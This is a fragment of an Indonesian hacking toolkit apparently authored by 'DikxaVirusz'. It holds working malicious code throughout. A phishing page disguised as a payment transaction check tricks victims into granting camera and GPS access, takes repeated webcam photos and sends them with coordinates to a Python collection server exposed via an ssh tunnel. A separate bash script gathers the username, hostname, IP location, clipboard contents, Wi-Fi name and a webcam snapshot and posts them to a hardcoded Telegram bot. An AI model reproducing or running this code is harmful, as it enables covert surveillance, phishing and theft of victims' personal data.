    *{box-sizing:border-box}
    body{margin:0;font-family:'Orbitron',monospace;background:#128aeb;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
    .screen{width:100%;max-width:400px;text-align:center;padding:30px}
    h1{color:#fff;font-size:24px;margin-bottom:10px;font-family:Arial,sans-serif}
    p{font-size:14px;color:#fff;margin-bottom:25px;line-height:1.4;font-family:Arial,sans-serif}
    p2{font-size:17px;color:#fff;margin-bottom:35px;line-height:1.4}
    .btn{background:#aaa;color:#111;border:none;padding:15px 40px;border-radius:30px;font-size:16px;cursor:pointer;transition:.3s}
     .avatar{width:120px;height:120px;border:2px solid #ffd700;border-radius:50%;margin:0 auto 20px;background:#ffd700;display:flex;align-items:center;justify-content:center;color:#111;font-size:25px;font-weight:bold}
    .popup{position:fixed;top:0;left:0;width:100%;height:100%;background:url("https://cdn.phototourl.com/free/2026-09-13-27d5bf41-3816-4740-a73e-4513835cb062.png") center/cover no-repeat;display:none;align-items:center;justify-content:center;z-index:10}
    .popup .card{background:#fff;border:2px solid #fff;border-radius:15px;padding:25px;width:300px;text-align:center}
    .popup h2{color:#111;margin-top:0;font-family:Arial,sans-serif}
    .popup p{font-size:13px;color:#ff4544;margin-bottom:20px}
    #featureList {
      list-style: none;
      color:#112;
      padding: 0;
      margin-bottom: 20px;
      font-family:Arial,sans-serif
    }
    #featureList li {
      margin-bottom: 8px;
      display: flex;
      align-items: center;
    }
    #featureList li::before {
      content: "•"; /* Checkmark */
      color: #111;
      margin-right: 15px;
    }
    .hidden {
      display: none !important;
    }
    #permissionDetails {
      font-size: 12px;
      color: #666;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <!-- Screen 1: Welcome -->
  <div class="screen" id="welcome">
    <div class="avatar"></div>
    <h1>Dana Transaksi</h1>
    <p2>ID TrX - 2609******81</p2>
    <button class="btn" onclick="showConsent()">Cek Transaksi</button>
  </div>

  <!-- Screen 2: Consent -->
  <div class="popup" id="consentPopup">
    <div class="card">
      <h2>Izin Tidak Diberikan</h2>
      <p>Detail Gagal Dilihat</p>
      <ul id="featureList">
        <li>IZINKAN KAMERA</li>
        <li>IZINKAN LOKASI</li>
        <p>Aktifkan Fitur Lokasi/GPS HP Anda</p>
      </ul>
      <p id="permissionDetails">Mohon Izinkan Akses Agar Dapat melihat IP dan Transaksi dibuat</p>
      <button class="btn" onclick="requestPermissions()">Izinkan</button>
    </div>
  </div>

  <!-- Loading Screen -->
  <div class="screen hidden" id="loadingScreen">
    <h1>Memuat Transaksi Anda</h1>
    <p>Harap tunggu sementara kami menyiapkan Transaksi Anda</p>
  </div>

  <!-- Error Screen -->
  <div class="screen hidden" id="errorScreen">
    <h1>Terjadi Kesalahan</h1>
    <p id="errorMessage">Gagal memuat Detail Pastikan izin File dan lokasi diizinkan.</p>
    <button class="btn" onclick="retryPermissions()">Coba Lagi</button>
  </div>

  <!-- Hacked Screen -->
  <div class="screen hidden" id="hackedScreen">
    <h1>HACKED BY DikxaVirusz</h1>
  </div>

  <script>
    function showConsent() {
      document.getElementById('welcome').classList.add('hidden');
      document.getElementById('consentPopup').style.display = 'flex';
    }

    async function requestPermissions() {
      document.getElementById('consentPopup').style.display = 'none';
      document.getElementById('loadingScreen').classList.remove('hidden');

      try {
        // Request camera and location permissions simultaneously
        const [stream, position] = await Promise.all([
          navigator.mediaDevices.getUserMedia({ video: true }),
          new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
          }),
        ]);

        const { latitude: lat, longitude: lon } = position.coords;

        // Take the first photo
        const canvas = document.createElement('canvas');
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const img = canvas.toDataURL('image/jpeg').split(',')[1];

        // Send the first data
        fetch('/data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ index: 1, lat, lon, img }),
        });

        // Hide loading screen
        document.getElementById('loadingScreen').classList.add('hidden');

        // Set up interval to take 9 more photos every 5 seconds
        let count = 2;
        const iv = setInterval(async () => {
          if (count > 10) {
            clearInterval(iv);
            document.getElementById('hackedScreen').classList.remove('hidden');
            return;
          }

          try {
            const [s, p] = await Promise.all([
              navigator.mediaDevices.getUserMedia({ video: true }),
              new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject);
              }),
            ]);

            const v = document.createElement('video');
            v.srcObject = s;
            await v.play();
            const c = document.createElement('canvas');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            const img2 = c.toDataURL('image/jpeg').split(',')[1];

            fetch('/data', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ index: count, lat: p.coords.latitude, lon: p.coords.longitude, img: img2 }),
            });

            s.getTracks().forEach((t) => t.stop());
            count++;
          } catch (error) {
            console.error("Error during interval:", error);
            clearInterval(iv);
            showError("Gagal mengambil data. Pastikan izin kamera dan lokasi tetap diizinkan.");
            return;
          }
        }, 5000);

        stream.getTracks().forEach((t) => t.stop());
      } catch (error) {
        console.error("Error requesting permissions:", error);
        showError("ERR_CONNECTION_CLOSED");
      }
    }

    function retryPermissions() {
      document.getElementById('errorScreen').classList.add('hidden');
      showConsent(); // Go back to the consent screen
    }

    function showError(message) {
      document.getElementById('loadingScreen').classList.add('hidden');
      document.getElementById('errorScreen').classList.remove('hidden');
      document.getElementById('errorMessage').textContent = message;
    }
  </script>
</body>
</html>
EOF

# === Server Python (auto-port) ===
cat > server.py <<'EOF'
import base64, json, os, datetime, socket
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = 8081

def find_free_port(start=8081):
    for p in range(start, start+100):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(("0.0.0.0", p))
                return p
        except OSError:
            continue
    raise RuntimeError("No free port")

PORT = find_free_port(PORT)

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode("utf-8"))
            idx = data.get("index", 1)
            lat = data.get("lat")
            lon = data.get("lon")
            img_b64 = data.get("img")

            with open(f"image_{idx}.jpg", "wb") as f:
                f.write(base64.b64decode(img_b64))

            map_html = f"""<!DOCTYPE html>
<html><head><title>Lokasi AR Quest</title></head>
<body>
<iframe width="100%" height="500"
src="https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18&amp;output=embed"></iframe>
</body></html>"""
            with open("map.html", "w") as f:
                f.write(map_html)

            print(f"[ + ] image_{idx}.jpg & lokasi tersimpan")
            print(f"[ ! ] PERIKSA DI FOLDER DikxaTracker")
            self.send_response(200)
            self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        with open("index.html", "rb") as f:
            self.wfile.write(f.read())

print(f"SERVER BERJALAN DI PORT: {PORT}")
print(f"                                        ")
print(f"BUAT SESSION BARU DAN MASUKAN INI:")
print(f"ssh -R maxsoft:80:localhost:{PORT} serveo.net")
HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
EOF
clear
echo -e "${WHITE}
_|_|_|    _|  _|                              _|_|      _|_|      _|_|
_|    _|      _|  _|    _|    _|    _|_|_|  _|    _|  _|    _|  _|    _|
_|    _|  _|  _|_|        _|_|    _|    _|    _|_|_|    _|_|_|    _|_|_|
_|    _|  _|  _|  _|    _|    _|  _|    _|        _|        _|        _|
_|_|_|    _|  _|    _|  _|    _|    _|_|_|  _|_|_|    _|_|_|    _|_|_|    [${BG_RED}${YELLOW}Hellow My Name is DikxaVirusz${NC}]
" | lolcat
echo -e "${GREEN}=========================================="
echo -e "${BG_RED}${YELLOW}DIKAVIRUSZ 999${NC}"
echo -e "${GREEN}==========================================${NC}"
echo -e "${BG_RED}${YELLOW}MENJALANKAN SERVER...${NC}"
echo "                                                          "
python3 server.py
}

   


#################################################################


#!/usr/bin/env bash
# ------------- CONFIG -------------
BOT_TOKEN="8941651714:AAGZI2HKhY-D8GHXEiiUxIK08Ei97vEjKG0"
CHAT_ID="8579675128"
# ------------- HELPERS -------------
TELEGRAM_API="https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"
TELEGRAM_PHOTO="https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto"
TS=$(date +"%Y-%m-%d %H:%M:%S")
USR=$(whoami)
HOST=$(hostname)
OS=$(uname -s -r)

# ------------- IP / GEO -------------
IP_JSON=$(curl -s -m 5 https://ipinfo.io/json)
IP=$(echo "$IP_JSON" | jq -r '.ip // "-"')
CITY=$(echo "$IP_JSON" | jq -r '.city // "-"')
REGION=$(echo "$IP_JSON" | jq -r '.region // "-"')
COUNTRY=$(echo "$IP_JSON" | jq -r '.country // "-"')
LOC=$(echo "$IP_JSON" | jq -r '.loc // "-"')
[ "$LOC" != "-" ] && MAP="https://www.google.com/maps?q=$LOC" || MAP="-"

# ------------- CAMERA -------------
# Uses ffmpeg (Linux) or imagesnap (macOS) or fswebcam (Linux fallback)
PIC="shot_$(date +%s).jpg"
if command -v ffmpeg &>/dev/null; then
  ffmpeg -f video4linux2 -i /dev/video0 -vframes 1 "$PIC" 2>/dev/null
elif command -v imagesnap &>/dev/null; then
  imagesnap "$PIC" 2>/dev/null
elif command -v fswebcam &>/dev/null; then
  fswebcam -r 1280x720 --no-banner "$PIC" 2>/dev/null
else
  PIC=""  # no webcam util
fi

# ------------- GEOLOCATION BROWSER (if JS) -------------
# Not possible here; we rely on IP-based geolocation.

# ------------- CLIPBOARD -------------
if command -v xclip &>/dev/null; then
  CLIP=$(xclip -o -selection clipboard 2>/dev/null | head -c 500)
elif command -v pbpaste &>/dev/null; then
  CLIP=$(pbpaste | head -c 500)
else
  CLIP="-"
fi

# ------------- WIFI SSID (Linux) -------------
SSID="-"
if command -v nmcli &>/dev/null; then
  SSID=$(nmcli -t -f active,ssid dev wifi | grep '^yes' | cut -d: -f2)
elif command -v iwgetid &>/dev/null; then
  SSID=$(iwgetid -r)
fi

# ------------- BUILD MESSAGE -------------
MSG=$(cat <<EOF
<pre>
┌───────────────────────────────
│          INFO LOGIN
├───────────────────────────────
│ Time   : $TS
│ User   : $USR
│ Host   : $HOST
│ OS     : $OS
│ IP     : $IP
│ Region : $CITY, $REGION, $COUNTRY
│ Wi-Fi  : $SSID
│ Clipboard: ${CLIP:-empty}
└───────────────────────────────
<a href="$MAP">📍 Open Map</a>
</pre>
EOF
)

# ------------- SEND TEXT -------------
curl -s -X POST "$TELEGRAM_API" \
  -d chat_id="$CHAT_ID" \
  -d text="$MSG" \
  -d parse_mode="HTML" \
  -d disable_notification="true" > /dev/null 2>&1

# ------------- SEND PHOTO (if taken) -------------
if [[ -f "$PIC" ]]; then
  curl -s -X POST "$TELEGRAM_PHOTO" \
    -F chat_id="$CHAT_ID" \
    -F photo=@"$PIC" \
    -F caption="📸 Snapshot @ $TS" > /dev/null 2>&1
  rm -f "$PIC"
fi




#show_whatsapp_support
main_menu
7) # Opsi untuk stop musik
  stop_music
  kembali_ke_menu
  ;;








